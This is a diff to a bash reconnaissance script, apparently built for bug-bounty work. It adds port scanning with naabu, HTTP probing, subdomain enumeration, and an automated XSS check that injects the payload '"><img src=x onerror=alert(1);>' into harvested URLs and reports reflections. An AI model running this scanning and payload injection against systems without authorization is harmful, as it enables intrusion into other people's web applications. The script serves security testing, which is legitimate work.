@@ -39,6 +39,17 @@ getfreshresolvers() {
   dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -o ~/tools/lists/my-lists/resolvers
 }
 
+ReconRedbull(){
+  naabu -l clean.subdomains -top-ports 100 -silent -sa -o naabuScan
+  httpx -l naabuScan -silent -status-code -tech-detect -title -timeout 60 -threads 100 -o HTTPOK
+  cat HTTPOK | grep 200 | awk -F " " '{print $1}' | anew 200HTTP
+  cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
+  cat HTTPOK | grep -v 404 | awk '{print $1}' | anew Without404
+  cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
+  dnsrecords
+  nucauto
+  xsshunter
+}
 newRecon(){
   subdomainenum
   [ -s "asn" ] && cat asn | metabigor net --asn | anew cidr
@@ -49,7 +60,6 @@ newRecon(){
   cat HTTPOK | grep -E '40[0-4]' | grep -Ev 404 | awk -F " " '{print $1}' | anew 403HTTP
   cat HTTPOK | grep -v 404 | awk '{print $1}' | anew Without404
   cat HTTPOK | awk -F " " '{print $1}' | anew ALLHTTP
-  getdata
   dnsrecords
   nucauto
   xsshunter
@@ -136,7 +146,7 @@ subdomainenum() {
   rm -f amass.subdomains
   cat domains | assetfinder -subs-only | anew all.subdomains
   curl -s "https://crt.sh/?q=%25.$Domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew all.subdomains
-  # findomain -t $Domain -q | anew all.subdomains
+  findomain -t $Domain -q | anew all.subdomains
   # xargs -a all.subdomains -I@ -P 10 sh -c 'assetfinder @ | anew recondorecon'
   # cat recondorecon | grep $Domain | anew all.subdomains
   cat all.subdomains | dnsx -silent | anew clean.subdomains
@@ -320,15 +330,19 @@ xsshunter() {
   
   echo "INIT XSS HUNTER" | notify -silent -id xss
   echo "INIT XSS HUNTER"
-  python3 $HOME/Tools/xnLinkFinder/xnLinkFinder.py -vv -d 2 -i 200HTTP -sp 200HTTP -sf domains -o urldump.txt
+  # python3 $HOME/Tools/xnLinkFinder/xnLinkFinder.py -vv -d 2 -i 200HTTP -sp 200HTTP -sf domains -o urldump.txt
   for domain in $(cat domains)
   do
-    python3 $HOME/Tools/waymore/waymore.py -i $domain -mode U
-    cat $HOME/Tools/waymore/results/$domain/waymore.txt | anew urldump.txt
+    python3 $HOME/Tools/Waymore/waymore.py -i $domain -mode U
+    cat $HOME/Tools/Waymore/results/$domain/waymore.txt | anew urldump.txt
   done
   [ -s "urldump.txt" ] && cat urldump.txt | uro | kxss | awk '{print $9}' | anew filtered_urls.txt
-  [ -s "filtered_urls.txt" ] && dalfox file filtered_urls.txt --skip-bav -o XSSresult
-  [ -s "XSSresult" ] && cat XSSresult | notify -id xss
+  [ -s "urldump.txt" ] && cat urldump.txt | uro | gf xss | httpx -silent | anew filtered_urls.txt
+  # [ -s "filtered_urls.txt" ] && dalfox file filtered_urls.txt --skip-bav -o XSSresult
+  # [ -s "XSSresult" ] && cat XSSresult | notify -id xss
+    echo '[+] Freq xss'
+  [ -s "filtered_urls.txt" ] && cat filtered_urls.txt | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' | anew FreqXSS.txt
+  [ -s "FreqXSS.txt" ] && cat FreqXSS.txt | notify -silent -id xss
 }
 bypass4xx() {
   [ -s "403HTTP" ] && cat 403HTTP | dirdar -only-ok | anew dirdarResult.txt
